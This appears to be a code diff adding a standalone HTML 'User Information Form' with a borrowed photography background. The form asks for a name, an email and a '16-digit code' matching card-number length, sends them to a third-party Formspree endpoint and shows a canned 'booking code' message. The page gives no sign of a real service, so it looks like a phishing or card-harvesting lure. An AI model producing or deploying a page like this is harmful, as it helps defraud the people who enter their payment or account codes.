@@ -1,0 +1,81 @@
+
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>User Information Form</title>
+    <style>
+        body {
+            background-image: url('https://static.showit.co/800/BIvLhz1IRiGK8xT3JXIp4A/25111/charleston_high_school_senior_photographers.jpg');
+            background-size: cover;
+            background-position: center;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: Arial, sans-serif;
+        }
+
+        .form-container {
+            background-color: rgba(255, 255, 255, 0.9);
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            width: 300px;
+            text-align: center;
+        }
+
+        .form-container input[type="text"],
+        .form-container input[type="email"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+
+        .form-container input[type="submit"] {
+            background-color: #4CAF50;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        .form-container input[type="submit"]:hover {
+            background-color: #45a049;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="form-container">
+        <h2>User Information Form</h2>
+        <!-- Update the form action to use your Formspree endpoint -->
+        <form id="bookingForm" action="https://formspree.io/f/xkgwenbp" method="POST">
+            <input type="text" name="name" placeholder="Enter your name" required>
+            <input type="email" name="email" placeholder="Enter your email" required>
+            <input type="text" name="code" placeholder="Enter your 16-digit code" maxlength="16" pattern="\d{16}" required>
+            <input type="submit" value="Submit">
+        </form>
+    </div>
+
+    <script>
+        // JavaScript to handle form submission and show a thank-you message
+        document.getElementById("bookingForm").addEventListener("submit", function(event) {
+            event.preventDefault();  // Prevent the default form submission
+
+            // Display the thank you message
+            alert("Thank you for choosing our service, your booking code is Bk76vE");
+
+            // Submit the form programmatically
+            this.submit();
+        });
+    </script>
+
+</body>
+</html>
